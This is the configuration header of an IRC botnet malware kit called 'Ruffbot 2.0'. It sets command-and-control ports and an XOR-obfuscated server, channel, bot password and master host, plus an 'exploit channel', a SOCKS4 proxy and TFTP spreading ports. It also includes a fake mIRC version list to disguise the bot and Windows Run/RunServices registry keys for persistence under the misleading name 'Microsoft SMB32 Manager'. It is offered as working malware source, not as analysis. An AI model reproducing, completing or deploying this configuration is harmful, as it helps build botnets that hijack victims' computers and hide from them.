/*
XXXXXXXXXXXXXX   XXXXX      XXXXX  XXXXXXXXXXXXX   XXXXXXXXXXXXX  
XXXXXXXXXXXXXXX  XXXXX      XXXXX  XXXXXXXXXXXXXX  XXXXXXXXXXXXXX 
XXXXXXXXXXXXXXX  XXXXX      XXXXX  XXXXXXXXXXXXX   XXXXXXXXXXXXX  
XXXX       XXXX  XXXXX      XXXXX  XXXXX           XXXXX            
XXXX       XXXX  XXXXX      XXXXX  XXXXX           XXXXX            
XXXXXXXXXXXXXXX  XXXXX      XXXXX  XXXXXXXXXXX     XXXXXXXXXXX     
XXXXXXXXXXXXXX   XXXXX      XXXXX  XXXXXXXXXXXX    XXXXXXXXXXXX     
XXXXXXXXX        XXXXX      XXXXX  XXXXXXXXXXX     XXXXXXXXXXX    
XXXX XXXXX       XXXXX      XXXXX  XXXXX           XXXXX           
XXXX  XXXXX      XXXXX      XXXXX  XXXXX           XXXXX           
XXXX   XXXXX     XXXXX      XXXXX  XXXXX           XXXXX           
XXXX    XXXXX    XXXXXX    XXXXXX  XXXXX           XXXXX           
XXXX     XXXXX   XXXXXXXXXXXXXXXX  XXXXX           XXXXX           
XXXX      XXXXX   XXXXXXXXXXXXXX   XXXXX           XXXXX           
XXXX       XXXXX   XXXXXXXXXXXX    XXXXX           XXXXX 
     



        Ruffbot 2.0 [PrivShit] by Ruffnes

*/ 


// PORTS
int port = 6667;
int port2 = 6667;
int socks4port = 8080;
int tftpport = 69;
int rloginport = 22;
int httpport = 81;
unsigned short bindport = 4460;


// MISC. SETTINGS
BOOL topiccmd = TRUE;
BOOL rndfilename = FALSE;
BOOL AutoStart = TRUE;
int maxrand = 4;
int nicktype = CONSTNICK;
BOOL nickprefix = TRUE;


// BOT PREFIX
char prefix = '.';


// SERVER SETTINGS
#ifndef NO_CRYPT //
	char server[] = "\x12\x1A\xD4\x16\x4A\xD4\xF9\x60\xA5\x3E\x50\x9B\x1E";
	char serverpass[] = "";
	char channel[] = "\x07\x7F\xB7\x66";
	char chanpass[] = "\x6B\x5B\xB4\x17\x3F";
	char server2[] = "\x12\x1A\xD4\x16\x4A\xD4\xF9\x60\xA5\x3E\x50\x9B\x1E";
	char channel2[] = "\x07\x7F\xB7\x66";
	char chanpass2[] = "\x6B\x5B\xB4\x17\x3F";
#else
	char server[] = "";
	char serverpass[] = "";
	char channel[] = "";
	char chanpass[] = "";
	char server2[] = "";
	char channel2[] = "";
	char chanpass2[] = "";
#endif

// LOGIN PASSWORD
#ifndef NO_CRYPT //
	char password[] = "\x75\x5B\xBF\x56\x2F\x9B\x82\x38\xD2\x7C\x4F\x98\x1D\x30\x9A\xFE\x88\xD7\x3F\x97";
#else
	char password[] = "";
#endif


// BOT FILENAME SETTINGS
#ifndef NO_CRYPT //
	char filename[] = "\x57\x41\x98\x0A\x1E\x9A\xB2";
	char szLocalPayloadFile[]= "\x57\x41\x98\x40\x1A\x96\xE4\x63\xB3\x68\x1F\xDE";
	char logfile[]= "\x47\x16\xA6\x78\x08\x8F\xB5\x62\xAF\x22\x1A\xCB\x5A";
#else
	char filename[] = "";
	char szLocalPayloadFile[]= "";
	char logfile[]= "";
#endif

// BOT CONFIGURATION
#ifndef NO_CRYPT //
	char botid[] = "\x7F\x7F\xB7\x66\x5B\xA0\x98\x05\xC0";
	char version[] = "\x7F\x7F\xB7\x66\x5B\xA0\x98\x05\xBD\x5A\x4F\x84\x1E\x2A\x9F\x95";
	char nickconst[] = "\x77\x61\xB8\x58";
	char modeonconn[] = "\x0F\x54";
#else
	char botid[] = "";
	char version[] = "";
	char nickconst[] = "";
	char modeonconn[] = "";
#endif

// EXPLOIT CHANNEL
#ifndef NO_CRYPT //
	char exploitchan[] = "\x07\x7F\xB7\x66";
#else
	char exploitchan[] = "";
#endif

// MASTER HOST
#ifndef NO_CRYPT //
	char *authost[] = {
		"\x66\x43\x89\x57\x36\x83\xB9\x11\xDF\x63\x0D\xD9\x63\x65\xC1\x9A\xD0\x80\x72\xC2\xC9\x87\xE3\x32\xE3\x36\xB4\x9C"
	};
#else
	char *authost[] = {
		""
	};
#endif

// FAKE VERSION LIST
char *versionlist[] = {
	"mIRC v6.03 Khaled Mardam-Bey",
	"mIRC v6.10 Khaled Mardam-Bey",
	"mIRC v6.12 Khaled Mardam-Bey",
	"mIRC v6.14 Khaled Mardam-Bey"
};


// REGISTRY SETTINGS
char valuename[] = "Microsoft SMB32 Manager";
char regkey1[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
char regkey2[]="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
char regkey3[]="Software\\Microsoft\\OLE";
char regkey4[]="SYSTEM\\CurrentControlSet\\Control\\Lsa";





